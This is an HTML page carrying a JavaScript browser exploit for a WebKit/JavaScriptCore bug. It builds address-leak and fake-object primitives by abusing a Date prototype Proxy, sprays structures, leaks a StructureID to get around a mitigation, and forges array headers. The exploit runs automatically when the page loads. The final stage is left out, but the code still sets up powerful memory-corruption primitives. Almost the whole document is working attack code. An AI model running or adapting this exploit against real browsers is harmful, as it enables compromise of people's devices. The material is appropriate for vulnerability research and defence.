<script src="utils.js"> </script>
<script>
/*
 * Copyright (C) 2019 Alexandro Luongo (w00dl3cs).
 *
 * Bug found by Luca Todesco (qwertyoruiop)
 * Original PoC here: http://rce.party/wtf.js
 */
//let print = alert;
var datePrototype = undefined;
let stage1 = {
        addrof: function(obj) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function InfoLeaker(arg) {
            0 in date;
            return arg[0];
        }

        for (var i = 0; i < 10000; ++i)
            InfoLeaker(arg);

        var handler = {
            has: function() {
                arg[0] = obj;
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        var addr = InfoLeaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        if (addr !== 1.1 && typeof addr !== 'object')
            return Int64.fromDouble(addr);

       fail("Could not leak address using 'addrof' primitive!");
    },
        fakeobj: function(addr) {
        let arg = [1.1, 2.2, 3.3];

        let date = new Date();
        date[1] = 1;

        function ObjFaker(arg) {
            0 in date;
            arg[0] = addr;
        }

        for (var i = 0; i < 10000; ++i)
            ObjFaker(arg);

        var handler = {
            has: function() {
                arg[0] = {};
                return false;
            }
        }

        Object.setPrototypeOf(Date.prototype, new Proxy(datePrototype, handler));

        ObjFaker(arg);

        Object.setPrototypeOf(Date.prototype, datePrototype);

        var obj = arg[0];
        if (typeof obj === 'object')
            return obj;

       fail("Could not inject fake object using 'fakeobj' primitive!");
    }
};
let fail = function fail(x)
    {
        alert('FAIL: ' + x);
        location.reload();
        throw null;
    }
    
function init() {
datePrototype = Object.getPrototypeOf(Date.prototype);
}
//
// Update: December, 2019
//
// On December, 5th 2019, security researcher Wang Yong (@ThomasKing2014) from
// Alibaba Security presented his talk "Thinking outside the JIT Compiler" at
// BlackHat Europe, proposing two different methods to bypass StructureID
// randomization.
//
// You can find his presentation here (for reference):
// https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
//
// As a public technique to bypass such mitigation has been released, I think
// it's time to update this exploit to reflect the changes accordingly.
//

var structs = [];

function sprayStructures() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs.push(a);
    }
}

var structs1 = [];

function sprayStructures1() {
    for (var i = 0; i < 1000; i++) {
        var a = [13.37];
        a['prop'] = 13.37;
        a['prop' + i] = 13.37;
        structs1.push(a);
    }
}

function pwn() {
    init();
    var primitives = stage1;
    sprayStructures1();
    var victim1 = structs1[Math.floor(Math.random() * structs1.length)];
    var jsDoubleCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x7,                                   // m_indexingTypeAndMisc (ArrayWithDouble)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

    var jsContiguousCellHeader = new Int64([
        0x00, 0x02, 0x00, 0x00,                // m_structureID (0x00000200)
        0x9,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
        0x20,                                  // m_type (ArrayType)
        0x8,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);
    var container = {
        jsCellHeader: jsContiguousCellHeader.asJSValue(),
        butterfly: victim1
    };

    var containerAddr = primitives.addrof(container);
    print("[+] Container @ " + containerAddr);

    var fakeArrayAddr = Add(containerAddr, 0x10);
    print("[+] Fake Array @ " + fakeArrayAddr);

    var driver1 = primitives.fakeobj(fakeArrayAddr.asDouble());
    alert("made it");
    //alert(typeof driver1)
    while (!(driver1 instanceof Array)) {
        jsDoubleCellHeader.assignAdd(jsDoubleCellHeader, Int64.One);
        jsContiguousCellHeader.assignAdd(jsContiguousCellHeader, Int64.One);

        container.jsCellHeader = jsContiguousCellHeader.asJSValue();
    }
    // ArrayWithContiguous
    var boxed = [{}];
    alert("here")
    // ArrayWithDouble
    var unboxed = [13.37, 13.37];
    driver1[1] = unboxed;

    var shared_butterfly = Int64.fromDouble(victim1[1]);
    print("[+] Shared butterfly @ " + shared_butterfly);
    driver1[1] = boxed;

    victim1[1] = shared_butterfly.asDouble();
    container.jsCellHeader = jsDoubleCellHeader.asJSValue();

    //
    // Time to upgrade exploit primitives!
    //
    primitives = {
        addrof: function(obj) {
            boxed[0] = obj;
            return Int64.fromDouble(unboxed[0]);
        },

        fakeobj: function(addr) {
            unboxed[0] = addr.asDouble();
            return boxed[0];
        },};
    alert("testing");
    alert("done")
    //alert("addr:" + primitives.addrof([]));
    sprayStructures();

    var targetArray = new Array();
    function leakStructureId(victimObj) {
    var symbolCellHeader = new Int64([
        0x00, 0x00, 0x00, 0x00,
        0x0,
        0x2,
        0x10,
        0x1
    ]);

    var lengthAndFlag = new Int64([
        0x02, 0x00, 0x00, 0x00,
        0x04, 0x00, 0x00, 0x00
    ]);

    var container = {
        jsCellHeader: symbolCellHeader.asJSValue(),
        m_uid: null,
        length_flag: lengthAndFlag.asJSValue(),
        description: victimObj
    };

    var containerAddr = primitives.addrof(container);
    var fakeSymbolAddr = Add(containerAddr, 0x10);
    var fakeStringAddr = Add(fakeSymbolAddr, 0x10);

    var fakeString = primitives.fakeobj(fakeStringAddr.asDouble());

    container.m_uid = fakeString;

    var fakeSymbol = primitives.fakeobj(fakeSymbolAddr.asDouble());
    alert(fakeStringAddr)
    var structureId = "";
    var symbolDescription = Symbol.prototype.toString.call(fakeSymbol);
    for (var i = 0; i < 2; ++i)
        structureId += ("0000" + symbolDescription.charCodeAt(8 - i).toString(16)).slice(-4);

    return structureId.match(/.{1,2}/g).map(x => "0x" + x).reverse();
}

    var structureId = leakStructureId(targetArray);
    //alert("StructureID:" + structureId);
    alert("done leak");
    var jsCellHeader = new Int64([
        ...structureId,                        // m_structureID
        0x0,                                   // m_indexingTypeAndMisc (ArrayWithContiguous)
        0x27,                                  // m_type (ArrayType)
        0x18,                                   // m_flags (OverridesGetOwnPropertySlot)
        0x1                                    // m_cellState (DefinitelyWhite)
    ]);

   // var victim = structs[Math.floor(Math.random() * structs.length)];
    var hax = new Uint8Array(0x1000);
  
    var container1 = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    var addr1 = primitives.addrof(container1);
    print("[+] Container @ " + addr1);

    var fakeArray1 = Add(addr1, 0x10);
    print("[+] Fake Array @ " + fakeArray1);

    var driver2 = primitives.fakeobj(fakeArray1.asDouble());

    if (!(driver2 instanceof Float64Array))
        alert("Could not create fake Array!");

    //
    // For brevity, the remaining part of the exploitation process has
    // been redacted: you can find the in-depth analysis in other
    // write-ups available on this repository.
    //
    // Keep in mind that WebAssembly memory is now caged, and that
    // at the time of writing there is no public technique which can
    // be used to bypass that mitigation. But with Structure ID randomization
    // not being a problem anymore, one could achieve arbitrary memory
    // R/W primitives by abusing boxed/unboxed arrays.
    //
    // If you want to read more about the mitigations discussed here,
    // ypu can have a look at the following commits on the WebKit repository:
    //
    // * WebAssembly Gigacage:      https://github.com/WebKit/webkit/commit/385d20a0e36c9a7db638b26273ddc9c92b573cdc
    // * StructureID randomization: https://github.com/WebKit/webkit/commit/f19aec9c6319a216f336aacd1f5cc75abba49cdf
    //
}
pwn();
    
    </script>